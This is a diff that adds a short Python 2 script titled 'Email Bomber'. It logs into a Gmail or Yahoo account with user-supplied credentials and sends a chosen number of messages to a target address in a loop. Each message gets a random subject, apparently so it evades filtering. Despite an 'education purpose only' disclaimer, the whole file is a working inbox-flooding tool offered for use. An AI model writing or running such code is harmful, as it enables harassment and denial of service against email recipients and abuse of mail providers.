@@ -1,0 +1,52 @@
+#!/usr/bin/python
+# Email Bomber
+# This code for education purpose only.
+# Use it at your own risk!
+
+import os
+import smtplib
+import getpass
+import sys
+
+server = raw_input ('Choose Gmail/Yahoo: ')
+user = raw_input('Email Address: ')
+passwd = getpass.getpass('Password: ')
+
+
+to = raw_input('\nTarget Mail: ')
+subject = raw_input('Subject: ')
+body = raw_input('Message: ')
+total = input('Threads: ')
+
+if server == 'gmail':
+    smtp_server = 'smtp.gmail.com'
+    port = 587
+elif server == 'yahoo':
+    smtp_server = 'smtp.mail.yahoo.com'
+    port = 25
+else:
+    print 'Applies only to gmail and yahoo.'
+    sys.exit()
+
+print ''
+
+try:
+    server = smtplib.SMTP(smtp_server,port)
+    server.ehlo()
+    if smtp_server == "smtp.gmail.com":
+            server.starttls()
+    server.login(user,passwd)
+    for i in range(1, total+1):
+        subject = os.urandom(9)
+        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
+        server.sendmail(user,to,msg)
+        print "\rE-mails sent: %i" % i
+        sys.stdout.flush()
+    server.quit()
+    print '\n successfully sent!'
+except KeyboardInterrupt:
+    print '[-] Canceled'
+    sys.exit()
+except smtplib.SMTPAuthenticationError:
+    print '\n[!] Maybe Username and Passphrase entered wrong'
+    sys.exit()
